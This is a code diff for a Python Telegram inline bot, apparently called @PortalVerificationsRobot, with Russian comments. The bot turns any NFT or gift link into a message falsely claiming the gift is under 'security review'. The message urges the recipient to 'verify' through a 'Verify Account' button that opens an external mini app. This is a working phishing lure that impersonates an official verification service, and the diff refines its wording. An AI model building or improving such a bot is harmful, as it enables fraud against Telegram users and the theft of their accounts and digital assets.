@@ -52,7 +52,7 @@ async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
             InlineQueryResultArticle(
                 id="1",
                 title="Вставьте ссылку на подарок",
-                description="Например: https://t.me/nft/123",
+                description="Например: https://t.me/nft/JollyChimp-20203",
                 input_message_content=InputTextMessageContent(
                     "Пожалуйста, введите ссылку на подарок после @PortalVerificationsRobot"
                 )
@@ -62,51 +62,43 @@ async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     # Проверяем, что это ссылка на NFT/подарок
-    # Поддерживаем форматы:
-    # - https://t.me/nft/...
-    # - https://t.me/gift/...
-    # - любые другие ссылки
-    
     is_valid_link = re.match(r'^https?://t\.me/(nft|gift|portal)/', query)
     
     if is_valid_link or query.startswith('http'):
-        # ФОРМИРУЕМ СООБЩЕНИЕ С КНОПКОЙ
         keyboard = [
             [InlineKeyboardButton("✅ Verify Account", web_app=WebAppInfo(url=MINI_APP_URL))]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
         # Извлекаем ID подарка из ссылки
-        gift_id = query.split('/')[-1] if '/' in query else 'Unknown'
+        gift_id = query.split('/')[-1] if '/' in query else 'JollyChimp-20203'
         
+        # ⚡ ТОЧНЫЙ ТЕКСТ КАК ТЫ НАПИСАЛ
         message = (
-            f"🎁 *Gift Verification Required*\n\n"
-            f"**Sky Stilettos #{gift_id}** is currently undergoing a security review.\n\n"
+            f"❄️ *Gift temporarily unavailable*\n\n"
+            f"*{gift_id}* is currently undergoing a security review.\n\n"
             f"To regain access, please verify the gift using the official bot below.\n\n"
             f"🔗 [View Gift]({query})\n\n"
             f"A single tap below and the asset is on its way."
         )
         
-        # Результат инлайн-запроса
         results = [
             InlineQueryResultArticle(
                 id="1",
-                title=f"Подарок {gift_id}",
-                description=f"Отправить сообщение с кнопкой Verify Account для {gift_id}",
+                title=f"JollyChimp #20,203",
+                description=f"Отправить сообщение с кнопкой Verify Account",
                 input_message_content=InputTextMessageContent(
                     message_text=message,
                     parse_mode='Markdown',
                     disable_web_page_preview=False
                 ),
                 reply_markup=reply_markup,
-                # Добавляем превью фото
                 thumb_url=PHOTO_URL
             )
         ]
         await update.inline_query.answer(results)
         
     else:
-        # Если ссылка невалидная
         results = [
             InlineQueryResultArticle(
                 id="1",
@@ -114,7 +106,7 @@ async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 description="Введите корректную ссылку на подарок",
                 input_message_content=InputTextMessageContent(
                     "❌ Пожалуйста, введите корректную ссылку на подарок.\n\n"
-                    "Пример: `https://t.me/nft/123`"
+                    "Пример: `https://t.me/nft/JollyChimp-20203`"
                 )
             )
         ]
@@ -128,7 +120,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "2. Выбери результат\n"
         "3. Отправь сообщение\n\n"
         "Пример:\n"
-        "`@PortalVerificationsRobot https://t.me/nft/123`\n\n"
+        "`@PortalVerificationsRobot https://t.me/nft/JollyChimp-20203`\n\n"
         "Или просто нажми /start для теста",
         parse_mode='Markdown'
     )
@@ -136,7 +128,6 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 def main():
     application = Application.builder().token(TOKEN).build()
     
-    # Регистрируем обработчики
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("help", help_command))
     application.add_handler(InlineQueryHandler(inline_query))
